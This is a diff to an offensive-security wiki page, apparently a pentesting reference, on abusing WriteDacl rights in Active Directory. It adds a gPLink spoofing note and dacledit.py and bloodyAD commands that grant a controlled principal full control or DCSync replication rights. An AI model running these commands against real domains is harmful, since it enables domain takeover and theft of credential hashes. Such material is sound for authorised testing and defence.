@@ -16,18 +16,24 @@ If attacker can write an ACE (`WriteDacl`) for a container or organisational uni
 Impacket's dacledit (Python) can be used with the `-inheritance` flag for that purpose ([PR#1291](https://github.com/fortra/impacket/pull/1291)).
 {% endhint %}
 
+{% hint style="info" %}
+**adminCount=1 (gPLink spoofing)**
+
+In April 2024, [Synacktiv explained](https://www.synacktiv.com/en/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory) that if `GenericAll`, `GenericWrite` or `Manage Group Policy Links` privileges are available against an Organisational Unit (OU), then it's possible to compromise its child users and computers with `adminCount=1` through "gPLink spoofing".
+
+This can be performed with [OUned.py](https://github.com/synacktiv/OUned).
+{% endhint %}
+
 {% tabs %}
 {% tab title="UNIX-like" %}
 From UNIX-like systems, this can be done with [Impacket](https://github.com/SecureAuthCorp/impacket)'s dacledit.py (Python).
 
-:warning: _At the time of writing, May 2nd 2022, the_ [_Pull Request (#1291)_](https://github.com/SecureAuthCorp/impacket/pull/1291) _is still pending._
-
 ```bash
 # Give full control
-dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target 'target_object' 'domain'/'user':'password'
+dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"
 
 # Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
-dacledit.py -action 'write' -rights 'DCSync' -principal 'controlled_object' -target 'target_object' 'domain'/'user':'password'
+dacledit.py -action 'write' -rights 'DCSync' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"
 ```
 
 For a DCSync granting attack, instead of using dacledit, [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) has the ability to operate that abuse with the `--escalate-user` option (see [this](https://medium.com/@arkanoidctf/hackthebox-writeup-forest-4db0de793f96)).
@@ -36,7 +42,17 @@ To enable inheritance, the `-inheritance` switch can be added to the command. Th
 
 ```bash
 # Give full control on the Users container with inheritance to the child object
-dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn 'CN=Users,DC=domain,DC=local' -inheritance 'domain'/'user':'password'
+dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn 'CN=Users,DC=domain,DC=local' -inheritance "$DOMAIN"/"$USER":"$PASSWORD"
+```
+
+Alternatively, it can be achieved using [bloodyAD](https://github.com/CravateRouge/bloodyAD)
+
+```bash
+# Give full control (with inheritance to the child object if applicable)
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TargetObject" "$ControlledPrincipal"
+
+# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$ControlledPrincipal"
 ```
 {% endtab %}
 
